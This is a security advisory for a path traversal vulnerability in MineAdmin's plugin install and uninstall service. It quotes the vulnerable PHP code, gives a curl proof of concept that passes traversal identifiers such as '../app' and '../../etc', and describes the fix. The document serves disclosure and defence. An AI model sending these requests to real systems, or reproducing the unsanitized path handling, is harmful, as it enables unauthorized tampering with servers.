# [H] MineAdmin Vulnerable to Path Traversal via Unsanitized identifier in Plugin Install/Uninstall

## Summary
Severity: High
Advisory: GHSA-59xm-4m8c-g3xj
CVE: CVE-2026-55224
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-59xm-4m8c-g3xj
Type: github-advisory

## Affected
- Packagist: `mineadmin/mineadmin` — affected >=0 <3.2.0-alpha.2

## Details
## Path Traversal via Unsanitized Identifier in Plugin Install/Uninstall

### Summary
The app-store plugin service concatenates unsanitized user-supplied `identifier` values directly into file system paths. An attacker can use path traversal sequences (e.g., `../`) to read, install, or uninstall plugins from arbitrary directories, and potentially execute arbitrary composer commands.

### Vulnerable Code

**File:** `plugin/mine-admin/app-store/src/Service/Service.php`

```php
// Line 32 - download(): path traversal via identifier
public function download(array $params): bool
{
    if (empty($params['identifier']) || empty($params['version'])) {
        $this->throwParamsFail();
    }
    $service = make(AppStoreServiceImpl::class);
    if (! is_dir(BASE_PATH . '/plugin/' . $params['identifier'])) {  // Path traversal
        $result = $service->download($params['identifier'], $params['version']);
        // ...
    }
    return true;
}

// Line 48 - install(): path traversal + Plugin::install() with raw identifier
public function install(array $params): bool
{
    // ...
    $path = BASE_PATH . '/plugin/' . $params['identifier'];  // Path traversal
    if (file_exists($path . '/install.lock')) {
        $this->throwAppInstalled();
    }
    Plugin::install($params['identifier']);  // May run composer commands with traversal path
    return true;
}

// Line 70 - unInstall(): same pattern
public function unInstall(array $params): bool
{
    // ...
    $path = BASE_PATH . '/plugin/' . $params['identifier'];  // Path traversal
    Plugin::uninstall($params['identifier']);  // Arbitrary uninstall
    return true;
}
```

**File:** `plugin/mine-admin/app-store/src/Controller/IndexController.php` (lines 25-26)

```php
#[Controller(prefix: 'admin/plugin/store')]
#[Middleware(middleware: AccessTokenMiddleware::class, priority: 100)]
// Only AccessTokenMiddleware -- no PermissionMiddleware (see GM-4340)
```

### Proof of Concept

```bash
# Install a "plugin" from a traversed path, potentially triggering composer on
# arbitrary directories
curl -X POST "http://localhost:9501/admin/plugin/store/install" \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"identifier": "../app", "version": "1.0.0"}'

# This resolves to BASE_PATH/plugin/../app = BASE_PATH/app
# Plugin::install("../app") processes the application directory as a plugin

# Check if arbitrary path exists:
curl -X POST "http://localhost:9501/admin/plugin/store/download" \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"identifier": "../../etc", "version": "1.0.0"}'
```

### Impact

- Path traversal enables reading directory existence outside the plugin directory
- `Plugin::install()` with a traversed identifier may run composer commands on arbitrary directories
- Combined with GM-4340 (missing PermissionMiddleware), any authenticated user can exploit this
- Could lead to arbitrary code execution depending on `Plugin::install()` implementation

### Remediation

Validate and sanitize the `identifier` parameter to reject path traversal sequences. Use `basename()` or a strict regex allowlist (e.g., `^[a-zA-Z0-9_-]+$`) before concatenating into file paths.\n\n---\n\n**Update:** This finding has now been fully reproduced and validated in a Docker environment. The vulnerability is confirmed exploitable as described in the original report.

## References
- https://github.com/mineadmin/MineAdmin/security/advisories/GHSA-59xm-4m8c-g3xj
- https://github.com/mineadmin/MineAdmin/commit/ca41902a2a5422676227e5088f4cc1dec06044f1
- https://github.com/mineadmin/MineAdmin
- https://github.com/mineadmin/MineAdmin/releases/tag/v3.2.0-alpha.2
